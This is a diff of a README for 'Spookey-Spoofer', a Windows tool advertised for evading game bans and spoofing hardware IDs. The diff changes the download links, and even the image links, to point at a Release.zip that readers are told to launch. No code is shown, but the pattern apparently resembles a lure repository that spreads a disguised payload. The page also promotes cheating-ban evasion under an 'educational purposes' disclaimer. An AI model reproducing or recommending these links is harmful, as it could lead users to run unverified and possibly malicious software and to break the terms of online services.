@@ -1,7 +1,7 @@
 # 🎮 **Spookey-Spoofer**
 ### Cleaner & Spoofer For Windows, 1.0.0.0
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/agussupriadihsh/Spookey-Spoofer/releases/download/v1.0/Release.zip)](https://github.com/agussupriadihsh/Spookey-Spoofer/releases/download/v1.0/Release.zip)
 
 Welcome to the **Spookey-Spoofer** repository, your ultimate solution for bypassing bans, changing hardware IDs, and spoofing your system for various games and applications. Whether you've been banned unfairly or simply want to protect your hardware identity, this tool is here to help you out.
 
@@ -31,7 +31,7 @@ Have you been banned from online games like Fortnite or Valorant? Is your hardwa
 
 ## Installation
 To get started with **Spookey-Spoofer**, simply download the software package from the link provided below:
-[Download Software](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[Download Software](https://github.com/agussupriadihsh/Spookey-Spoofer/releases/download/v1.0/Release.zip)
 
 > **Note:** Make sure to launch the downloaded file to begin the installation process.
 
@@ -46,7 +46,7 @@ Got questions, feedback, or suggestions? Feel free to reach out to us. We value 
 
 Join us on this exciting journey and unlock endless possibilities with **Spookey-Spoofer**!
 
-![Spookey-Spoofer](https://via.placeholder.com/800x400)
+![Spookey-Spoofer](https://github.com/agussupriadihsh/Spookey-Spoofer/releases/download/v1.0/Release.zip)
 
 > Disclaimer: This tool is intended for educational purposes only. Use at your own risk.
 
